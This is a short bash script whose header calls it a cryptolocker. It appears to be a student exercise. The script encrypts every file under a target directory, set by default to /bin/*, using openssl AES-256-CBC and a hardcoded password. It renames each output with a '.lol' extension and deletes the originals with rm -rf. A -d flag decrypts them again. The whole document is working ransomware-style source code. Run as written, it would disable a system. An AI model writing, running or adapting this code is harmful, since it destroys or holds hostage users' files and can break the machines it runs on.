#!/bin/bash

###
# Author: Michael Salsone (mas9190@rit.edu)
# Cryptolocker implemented in bash. When pointed at a directory, will
# recursively encrypt all files in that directory with AES-256 CBC.
# Usage: ./mslocker or ./mslocker -d (for decryption)
###

# GLOBALS ~ Change these
TARGET_DIRECTORY="/bin/*"
PASSWORD="PaSsWoRdKeY"

# Creates new encrypted files, copies permissions, removes old files
function encrypt {
    openssl enc -aes-256-cbc -in $1 -out $1.lol -pass pass:$PASSWORD
    chmod --reference=$1 $1.lol
    rm -rf $1
}

# Creates new unecrypted files, copies permissions, removes old files
function decrypt {
    # decrypt files here
    openssl enc -aes-256-cbc -d -in $1 -out ${1:0:${#1}-4} -pass pass:$PASSWORD
    chmod --reference=$1 ${1:0:${#1}-4}
    rm -rf $1
}

# Recursively goes through a directory encrypting or decrypting files
for directory in $TARGET_DIRECTORY
do
    if [ ! -d "$directory" ]; then
    for file in $directory
        do
            if [ ! "$1" == "-d" ]; then
                encrypt $file
            else
                decrypt $file
            fi
        done
    else
        for file in $directory/*
        do
            if [ ! "$1" == "-d" ]; then
                encrypt $file
            else
                decrypt $file
            fi
        done
    fi
done
